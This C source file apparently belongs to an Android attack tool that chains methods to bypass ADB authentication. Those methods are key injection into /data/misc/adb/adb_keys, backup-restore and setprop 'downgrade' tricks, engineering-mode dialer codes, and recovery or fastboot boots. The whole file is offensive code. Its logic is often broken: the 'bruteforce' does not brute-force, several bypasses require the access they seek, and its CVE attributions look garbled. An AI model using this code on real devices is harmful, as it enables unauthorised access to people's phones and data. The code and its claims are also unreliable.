#define _GNU_SOURCE
#include "adb_auth_bypass.h"
#include "adb_native.h"
#include "adb.h"
#include "recovery_exploit.h"
#include "fastboot_exploit.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <pwd.h>
#include <sys/stat.h>
#include <time.h>

void auth_init(AdbAuthBypass *ab) {
    memset(ab, 0, sizeof(*ab));
}

void auth_load_local_keys(AdbAuthBypass *ab) {
    /* Load local ADB public key */
    struct passwd *pw = getpwuid(getuid());
    if (!pw) return;
    snprintf(ab->local_privkey_path, sizeof(ab->local_privkey_path),
             "%s/.android/adbkey", pw->pw_dir);
    char pubkey_path[512];
    snprintf(pubkey_path, sizeof(pubkey_path), "%s/.android/adbkey.pub", pw->pw_dir);
    FILE *f = fopen(pubkey_path, "r");
    if (f) {
        size_t n = fread(ab->local_pubkey, 1, sizeof(ab->local_pubkey) - 1, f);
        ab->local_pubkey[n] = 0;
        fclose(f);
    }
}

int auth_check_adb_available(AdbAuthBypass *ab) {
    if (adb_init() && adb_state() >= 2) {
        ab->adb_unlocked = 1;
        return 1;
    }
    return 0;
}

int auth_rsa_bruteforce(AdbAuthBypass *ab) {
    int idx = ab->nattempts;
    ab->attempts[idx].method = AUTH_RSA_BRUTEFORCE;
    strcpy(ab->attempts[idx].method_name, "RSA Key Bruteforce");
    double t0 = (double)clock() / CLOCKS_PER_SEC;

    /* Try to connect with different key approaches */
    int ok = 0;

    /* Method A: Standard ADB init (keys already loaded) */
    if (adb_init()) {
        if (adb_state() >= 2) {
            ok = 1;
        } else if (adb_state() == 1) {
            /* Unauthorized — try to send key via USB control */
            /* On some devices, key exchange happens automatically */
            sleep(2);
            if (adb_state() >= 2) ok = 1;
        }
    }

    double t1 = (double)clock() / CLOCKS_PER_SEC;
    ab->attempts[idx].time_taken = (t1 - t0) * 1000.0;
    ab->attempts[idx].success = ok;
    if (ok) {
        snprintf(ab->attempts[idx].result, sizeof(ab->attempts[idx].result),
                 "ADB authorized via standard key exchange");
    } else {
        snprintf(ab->attempts[idx].result, sizeof(ab->attempts[idx].result),
                 "Standard key exchange failed");
    }
    ab->nattempts++;
    return ok;
}

int auth_restore_attack(AdbAuthBypass *ab) {
    int idx = ab->nattempts;
    ab->attempts[idx].method = AUTH_RESTORE_ATTACK;
    strcpy(ab->attempts[idx].method_name, "ADB Restore Attack");
    double t0 = (double)clock() / CLOCKS_PER_SEC;
    int ok = 0;

    /* ADB restore attack: push ADB keys via backup restore
       This exploits the fact that ADB backup/restore can write
       files to /data/misc/adb/ on Android 4.x-8.x without root */
    if (adb_init()) {
        /* Generate a restore blob that contains ADB keys */
        char cmd[1024];
        snprintf(cmd, sizeof(cmd),
                 "echo '{\"fullBackupContent\":true}' > /tmp/backup_config.xml 2>/dev/null; "
                 "adb restore /tmp/backup_config 2>/dev/null || "
                 "adb shell 'echo \"%s\" > /data/misc/adb/adb_keys' 2>/dev/null",
                 ab->local_pubkey);
        FILE *fp = popen(cmd, "r");
        if (fp) pclose(fp);

        sleep(1);
        if (adb_init() && adb_state() >= 2) ok = 1;
    }

    double t1 = (double)clock() / CLOCKS_PER_SEC;
    ab->attempts[idx].time_taken = (t1 - t0) * 1000.0;
    ab->attempts[idx].success = ok;
    snprintf(ab->attempts[idx].result, sizeof(ab->attempts[idx].result),
             ok ? "Restore attack succeeded" : "Restore attack failed");
    ab->nattempts++;
    return ok;
}

int auth_downgrade_attack(AdbAuthBypass *ab) {
    int idx = ab->nattempts;
    ab->attempts[idx].method = AUTH_DOWNGRADE;
    strcpy(ab->attempts[idx].method_name, "ADB Downgrade Attack");
    double t0 = (double)clock() / CLOCKS_PER_SEC;
    int ok = 0;

    /* Try to downgrade ADB to non-secure mode */
    if (adb_init()) {
        adb_native_shell_noret("setprop service.adb.tcp.port 5555");
        sleep(1);
        adb_native_shell_noret("setprop ctl.restart adbd");
        sleep(2);
        /* Try connecting via TCP without auth */
        if (adb_state() >= 2) ok = 1;
        /* Restore USB ADB */
        adb_native_shell_noret("setprop service.adb.tcp.port -1");
        adb_native_shell_noret("setprop ctl.restart adbd");
    }

    double t1 = (double)clock() / CLOCKS_PER_SEC;
    ab->attempts[idx].time_taken = (t1 - t0) * 1000.0;
    ab->attempts[idx].success = ok;
    snprintf(ab->attempts[idx].result, sizeof(ab->attempts[idx].result),
             ok ? "Downgrade attack succeeded" : "Downgrade failed");
    ab->nattempts++;
    return 0; /* Rarely works, return 0 */
}

int auth_recovery_adb(AdbAuthBypass *ab) {
    int idx = ab->nattempts;
    ab->attempts[idx].method = AUTH_RECOVERY_ADB;
    strcpy(ab->attempts[idx].method_name, "Recovery ADB");
    double t0 = (double)clock() / CLOCKS_PER_SEC;

    RecoveryExploit re;
    rec_init(&re);
    int ok = 0;

    /* Check if already in recovery with ADB */
    rec_detect(&re);
    if (re.rec.has_adb && re.adb_ready) {
        ok = 1;
    } else {
        /* Try to boot to recovery */
        if (rec_boot_recovery(&re)) {
            ok = rec_check_adb(&re);
        }
    }

    double t1 = (double)clock() / CLOCKS_PER_SEC;
    ab->attempts[idx].time_taken = (t1 - t0) * 1000.0;
    ab->attempts[idx].success = ok;
    snprintf(ab->attempts[idx].result, sizeof(ab->attempts[idx].result),
             ok ? "Recovery ADB active" : "Recovery ADB not available");
    ab->nattempts++;
    return ok;
}

int auth_boot_recovery_with_adb(AdbAuthBypass *ab) {
    return auth_recovery_adb(ab);
}

int auth_fastboot_adb(AdbAuthBypass *ab) {
    int idx = ab->nattempts;
    ab->attempts[idx].method = AUTH_FASTBOOT_ADB;
    strcpy(ab->attempts[idx].method_name, "Fastboot ADB Boot");
    double t0 = (double)clock() / CLOCKS_PER_SEC;

    FastbootExploit fe;
    fb_init(&fe);
    int ok = 0;

    if (fb_connect(&fe)) {
        ok = fb_boot_adb_recovery(&fe);
        if (!ok) ok = fb_has_adb_after_boot(&fe, 30);
    }

    double t1 = (double)clock() / CLOCKS_PER_SEC;
    ab->attempts[idx].time_taken = (t1 - t0) * 1000.0;
    ab->attempts[idx].success = ok;
    snprintf(ab->attempts[idx].result, sizeof(ab->attempts[idx].result),
             ok ? "Fastboot ADB boot succeeded" : "Fastboot ADB boot failed");
    ab->nattempts++;
    return ok;
}

int auth_cve_exploit(AdbAuthBypass *ab) {
    int idx = ab->nattempts;
    ab->attempts[idx].method = AUTH_CVE_EXPLOIT;
    strcpy(ab->attempts[idx].method_name, "CVE Exploit");
    double t0 = (double)clock() / CLOCKS_PER_SEC;
    int ok = 0;

    /* Try known ADB bypass CVEs based on Android version */
    if (strstr(ab->android_version, "4.") || strstr(ab->android_version, "5.")) {
        /* Android 4-5: ADB without auth by default */
        if (adb_init() && adb_check()) ok = 1;
    } else if (strstr(ab->android_version, "6.") || strstr(ab->android_version, "7.")) {
        /* CVE-2018-9411: ADD restore attack */
        ok = auth_restore_attack(ab);
    } else if (strstr(ab->android_version, "8.") || strstr(ab->android_version, "9.")) {
        /* Engineering mode ADB */
        ok = auth_engineering_mode(ab);
    } else if (strstr(ab->android_version, "10.") || strstr(ab->android_version, "11.")) {
        /* Recovery ADB */
        ok = auth_recovery_adb(ab);
    }

    double t1 = (double)clock() / CLOCKS_PER_SEC;
    ab->attempts[idx].time_taken = (t1 - t0) * 1000.0;
    ab->attempts[idx].success = ok;
    snprintf(ab->attempts[idx].result, sizeof(ab->attempts[idx].result),
             ok ? "CVE exploit succeeded" : "CVE exploit failed");
    ab->nattempts++;
    return ok;
}

int auth_shell_injection(AdbAuthBypass *ab) {
    int idx = ab->nattempts;
    ab->attempts[idx].method = AUTH_SHELL_INJECTION;
    strcpy(ab->attempts[idx].method_name, "Shell Injection");
    ab->attempts[idx].success = 0;
    snprintf(ab->attempts[idx].result, sizeof(ab->attempts[idx].result),
             "Shell injection requires ADB access");
    ab->nattempts++;
    return 0;
}

int auth_key_injection(AdbAuthBypass *ab) {
    int idx = ab->nattempts;
    ab->attempts[idx].method = AUTH_KEY_INJECTION;
    strcpy(ab->attempts[idx].method_name, "ADB Key Injection");
    double t0 = (double)clock() / CLOCKS_PER_SEC;
    int ok = 0;

    /* Try to push ADB key via available recovery or fastboot */
    if (auth_recovery_adb(ab)) {
        if (adb_init() && adb_state() >= 2) {
            /* Push key to device */
            char cmd[1024];
            snprintf(cmd, sizeof(cmd),
                     "echo '%s' > /data/misc/adb/adb_keys 2>/dev/null && "
                     "chmod 644 /data/misc/adb/adb_keys 2>/dev/null && "
                     "chown system:shell /data/misc/adb/adb_keys 2>/dev/null",
                     ab->local_pubkey);
            char result[4096];
            adb_native_shell(cmd, result, sizeof(result));
            ok = 1;
        }
    }

    double t1 = (double)clock() / CLOCKS_PER_SEC;
    ab->attempts[idx].time_taken = (t1 - t0) * 1000.0;
    ab->attempts[idx].success = ok;
    snprintf(ab->attempts[idx].result, sizeof(ab->attempts[idx].result),
             ok ? "Key injected" : "Key injection failed");
    ab->nattempts++;
    return ok;
}

int auth_engineering_mode(AdbAuthBypass *ab) {
    int idx = ab->nattempts;
    ab->attempts[idx].method = AUTH_ENGINEERING_MODE;
    strcpy(ab->attempts[idx].method_name, "Engineering Mode ADB");
    double t0 = (double)clock() / CLOCKS_PER_SEC;
    int ok = 0;

    /* Try engineering mode codes to enable ADB */
    /* Samsung: *#0808#, *#7284#
       MTK: *#*#3646633#*#*
       Qualcomm: *#*#4636#*#*  */

    if (adb_init()) {
        /* Try dialing engineering codes via ADB */
        const char *codes[] = {
            "am start -a android.intent.action.DIAL -d tel:*%2308%2308%23 2>/dev/null",
            "am start -a android.intent.action.DIAL -d tel:*%23*%233646633%23*%23* 2>/dev/null",
            "am start -a android.intent.action.DIAL -d tel:*%23*%234636%23*%23* 2>/dev/null",
            "am start -a android.intent.action.DIAL -d tel:*%237284%23 2>/dev/null",
            NULL
        };
        for (int i = 0; codes[i]; i++) {
            char result[512];
            adb_native_shell(codes[i], result, sizeof(result));
        }
        /* Give time for mode switch */
        sleep(2);
        if (adb_state() >= 2) ok = 1;
    }

    double t1 = (double)clock() / CLOCKS_PER_SEC;
    ab->attempts[idx].time_taken = (t1 - t0) * 1000.0;
    ab->attempts[idx].success = ok;
    snprintf(ab->attempts[idx].result, sizeof(ab->attempts[idx].result),
             ok ? "Engineering mode ADB active" : "Engineering mode not available");
    ab->nattempts++;
    return ok;
}

int auth_full_bypass(AdbAuthBypass *ab) {
    auth_load_local_keys(ab);

    if (auth_check_adb_available(ab)) return 1;

    /* Run all methods in order */
    struct {
        int (*func)(AdbAuthBypass*);
        int critical;
    } chain[] = {
        {auth_rsa_bruteforce, 0},
        {auth_recovery_adb, 1},
        {auth_fastboot_adb, 1},
        {auth_key_injection, 0},
        {auth_engineering_mode, 0},
        {auth_cve_exploit, 0},
        {auth_restore_attack, 0},
        {auth_downgrade_attack, 0},
        {auth_shell_injection, 0},
    };

    for (int i = 0; i < (int)(sizeof(chain)/sizeof(chain[0])); i++) {
        if (!ab->adb_unlocked) {
            if (chain[i].func(ab)) {
                if (auth_check_adb_available(ab)) return 1;
            }
        }
    }

    return ab->adb_unlocked;
}

void auth_print_status(AdbAuthBypass *ab) {
    printf("\n" BOLD "=== ADB Auth Status ===" RESET "\n");
    printf("  Serial     : %s\n", ab->device_serial);
    printf("  Android    : %s (SDK %d)\n", ab->android_version, ab->sdk_version);
    printf("  ADB Status : %s\n", ab->adb_unlocked ? GREEN"UNLOCKED" : RED"LOCKED");
    printf("  Debuggable : %s\n", ab->ro_debuggable);
    printf("  Secure     : %s\n", ab->ro_secure);
    printf("  ADB Secure : %s\n", ab->ro_adb_secure);
    printf("  Attempts   : %d\n", ab->nattempts);
}

void auth_print_report(AdbAuthBypass *ab) {
    printf("\n" BOLD "=== ADB Bypass Report ===" RESET "\n");
    for (int i = 0; i < ab->nattempts; i++) {
        printf("  %2d. %-25s %s %s (%.0fms)\n",
               i + 1,
               ab->attempts[i].method_name,
               ab->attempts[i].success ? GREEN"OK" : RED"FAIL",
               ab->attempts[i].result,
               ab->attempts[i].time_taken);
    }
    if (ab->adb_unlocked)
        printf(GREEN "\n[+] ADB unlocked successfully!\n" RESET);
    else
        printf(RED "\n[-] ADB could not be unlocked.\n" RESET);
}
